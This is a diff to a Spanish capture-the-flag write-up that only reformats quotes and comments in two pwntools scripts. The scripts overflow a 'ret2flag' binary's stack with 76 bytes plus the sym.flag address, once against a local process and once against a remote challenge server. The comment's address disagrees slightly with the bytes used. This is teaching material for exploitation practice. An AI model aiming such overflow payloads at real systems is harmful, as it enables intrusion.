@@ -33,12 +33,15 @@ Codigo:
 
 ```python
 #/usr/bin/python3
-from pwn import *#Ejecutar binario
-p=process(‘./ret2flag’)#Bytes para el crash 76
-payload=”A”*76
+from pwn import *
+#Ejecutar binario
+p=process('./ret2flag')
+#Bytes para el crash 76
+payload="A"*76
 #Direccion de la memoria de sym.flag 0x0840852d se debe entregar en little endian
-payload+=”\x2d\x85\x04\x08"#Esperamos el mensaje de la ejecucion del binario para enviar el payload
-p.recvuntil(‘Esta es la ultima vez en 32!’)
+payload+="\x2d\x85\x04\x08"
+#Esperamos el mensaje de la ejecucion del binario para enviar el payload
+p.recvuntil('Esta es la ultima vez en 32!')
 #Enviamos el payload
 p.sendline(payload)
 #Recibimos la respuest de forma interactiva
@@ -53,12 +56,15 @@ Por lo que ahora ya sabemos que funciona, lo haremos remoto solo le cambiamos la
 
 ```python
 #/usr/bin/python3
-from pwn import *#Ejecutar binario desde el host remoto
-p=remote(‘165.227.83.238’,8888)#Bytes para el crash 76
-payload=”A”*76
+from pwn import *
+#Ejecutar binario desde el host remoto
+p=remote('165.227.83.238',8888)
+#Bytes para el crash 76
+payload="A"*76
 #Direccion de la memoria de sym.flag 0x0840852d se debe entregar en little endian
-payload+=”\x2d\x85\x04\x08"#Esperamos el mensaje de la ejecucion del binario para enviar el payload
-p.recvuntil(‘Esta es la ultima vez en 32!’)
+payload+="\x2d\x85\x04\x08"
+#Esperamos el mensaje de la ejecucion del binario para enviar el payload
+p.recvuntil('Esta es la ultima vez en 32!')
 #Enviamos el payload
 p.sendline(payload)
 ```
